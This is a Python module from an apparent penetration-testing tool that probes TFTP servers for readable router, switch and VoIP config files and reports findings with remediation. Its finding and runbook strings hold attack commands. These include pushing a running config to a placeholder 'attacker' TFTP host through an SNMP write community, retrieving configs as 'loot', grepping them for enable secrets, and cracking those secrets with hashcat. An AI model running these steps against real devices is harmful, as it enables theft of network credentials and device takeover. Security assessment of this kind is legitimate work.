"""TFTP (69/udp): unauthenticated file transfer, no directory listing.

TFTP has no authentication and no directory listing, so enumeration is
"request a filename and see if it works". recce probes a small list of paths
network vendors commonly leave writable — router/switch configs, IOS images,
phone provisioning bundles — because a successful read of any of them is the
whole box.

Also pairs with the SNMP write-community path: with a RW community, a tester
tells the device to copy its running-config to an attacker-controlled TFTP
server, then reads it back here. recce points at that chain in the runbook.

One request, one packet. Stdlib socket + struct. Wire format: RFC 1350.
"""
from __future__ import annotations

import socket
import struct

from ..core.models import Host, Port


_DEFAULT_PORT = 69
_TIMEOUT = 3.0

_OP_RRQ = 1        # read request
_OP_DATA = 3
_OP_ERROR = 5

# Paths worth trying: canonical vendor config filenames + provisioning bundles.
# Small set on purpose — TFTP has no listing, every probe is a real request,
# and the point is fingerprint rather than exhaustive enumeration.
_CANDIDATES = [
    "running-config",              # Cisco IOS
    "startup-config",
    "config.text",                 # Catalyst
    "vlan.dat",
    "router.cfg",                  # Fortinet
    "system.cfg",                  # generic
    "sipdefault.cnf",              # Cisco Unified CM phones
    "SEPDEFAULT.cnf",
    "test",                        # dev leftover
    "test.txt",
]


def is_tftp(port: Port) -> bool:
    svc = (port.service or "").lower()
    return port.portid == 69 or "tftp" in svc


def _rrq(filename: str) -> bytes:
    """Read request: opcode 1 + null-term filename + null-term mode (octet)."""
    return struct.pack("!H", _OP_RRQ) + filename.encode("ascii", "replace") + b"\x00octet\x00"


def _try_read(ip: str, port: int, filename: str, timeout: float) -> tuple[str, str, bytes]:
    """Send an RRQ and read at most one packet. Returns (status, detail, data).

    status is "ok" (server started sending data), "err <code> <text>" (server
    refused), or "timeout" / "closed" for the ambiguous cases where TFTP will
    silently drop a request it doesn't like. The one-packet read is deliberate:
    the point is to detect existence, not to download."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.settimeout(timeout)
        s.sendto(_rrq(filename), (ip, port))
        data, _ = s.recvfrom(1024)
    except socket.timeout:
        return "timeout", "no reply within timeout", b""
    except OSError as e:
        return "closed", str(e), b""
    finally:
        s.close()
    if len(data) < 4:
        return "closed", "short reply", b""
    op = struct.unpack_from("!H", data, 0)[0]
    if op == _OP_DATA:
        return "ok", "server started sending DATA (block 1)", data[4:]
    if op == _OP_ERROR:
        code = struct.unpack_from("!H", data, 2)[0]
        try:
            msg = data[4:].split(b"\x00", 1)[0].decode("ascii", "replace")
        except UnicodeDecodeError:
            msg = ""
        return f"err {code}", msg or f"code {code}", b""
    return "closed", f"unknown opcode {op}", b""


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict:
    out: dict = {"reachable": False, "readable": [], "probed": len(_CANDIDATES)}
    for name in _CANDIDATES:
        status, detail, data = _try_read(ip, port, name, timeout)
        if status == "ok":
            out["reachable"] = True
            out["readable"].append({"file": name, "sample": data[:200].hex()})
        elif status.startswith("err"):
            out["reachable"] = True                 # server answered even in refusal
    # If nothing answered at all, mark it unreachable so findings() skips the host.
    return out


def tftp_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_tftp(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


def _finding(sev, title, target, detail, tool, cmd, rem, cwes, kind="",
             exploit_note="", depth_tier=""):
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": tool, "command": cmd, "remediation": rem,
            "cwes": cwes, "kind": kind,
            "exploit_note": exploit_note, "depth_tier": depth_tier}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_tftp(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"
            readable = pr.get("readable") or []
            if readable:
                files = ", ".join(r["file"] for r in readable[:5])
                out.append(_finding(
                    "critical" if any(r["file"].endswith("-config") or
                                      r["file"] in ("startup-config", "running-config",
                                                    "config.text", "router.cfg")
                                      for r in readable) else "high",
                    "TFTP serves vendor config / provisioning files unauthenticated",
                    tgt,
                    f"TFTP returned DATA for {len(readable)} probed file(s): {files}. "
                    f"TFTP has no auth and no listing — a hit on a device config file "
                    f"is the entire running config (credentials, keys, ACLs) or the "
                    f"phone provisioning bundle (SIP secrets). Combined with a SNMP "
                    f"write community, a tester tells the device to `copy running-"
                    f"config tftp://attacker/loot` and picks it up here.",
                    "tftp",
                    f"tftp {h.ip} -c get running-config   # or: atftp --get -r "
                    f"running-config -l loot.txt {h.ip}",
                    "Restrict TFTP to the management VLAN and require directory "
                    "isolation; move firmware/config distribution to SFTP.",
                    ["CWE-306", "CWE-522"], kind="tftp_readable",
                    exploit_note=(
                        "atftp --get -r running-config -l "
                        "loot/IP-running-config IP ; grep -Ei 'enable secret|"
                        "snmp-server community|username|line vty' "
                        "loot/IP-running-config ; hashcat -m 500 (type 5) or "
                        "-m 9200 (type 8) enable-secret."),
                    depth_tier="t2"))
            else:
                out.append(_finding(
                    "medium", "TFTP server reachable (unauthenticated by design)",
                    tgt,
                    f"TFTP answered but did not serve any of the {pr.get('probed', 0)} "
                    f"canonical filenames recce tried. The service itself has no "
                    f"authentication or listing — anything the operator knows a "
                    f"filename for can be read; anything writable can be modified. "
                    f"Pair with SNMP RW to name new files.",
                    "tftp",
                    f"tftp {h.ip}   # then: get <known-name>",
                    "Restrict TFTP to the management VLAN; move to SFTP where "
                    "possible.",
                    ["CWE-306"], kind="tftp_open",
                    exploit_note=(
                        "nmap -sU -p69 --script tftp-enum IP ; for RW "
                        "community: snmpset -v2c -c <RW> IP "
                        "1.3.6.1.4.1.9.9.96.1.1.1.1.14.111 i 1 ... (Cisco "
                        "config-copy MIB); then get the pushed file locally "
                        "via tftp; grep enable-secret."),
                    depth_tier="t1"))
    return out


def runbook(ip: str, port: int = _DEFAULT_PORT) -> list[dict]:
    return [
        {"phase": "enumerate", "tool": "nmap",
         "command": f"nmap -sU -p{port} --script tftp-enum {ip}",
         "why": "brute a small vendor filename list"},
        {"phase": "loot", "tool": "tftp",
         "command": f"tftp {ip} -c get running-config",
         "why": "if hit — the entire Cisco IOS config with enable secrets"},
        {"phase": "chain", "tool": "snmp+tftp",
         "command": f"snmpset -v2c -c <RW> {ip} 1.3.6.1.4.1.9.9.96.1.1.1.1.2.1 i 1 "
                    f"... (Cisco config-copy MIB) then tftp {ip} get running-config",
         "why": "with a SNMP RW community, tell the device to push its config here"},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from . import svccommon
    return svccommon.findings_to_vulns(fs, "tftp", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    from . import svcprobe
    targets = tftp_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["readable"] = len(pr.get("readable") or [])
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
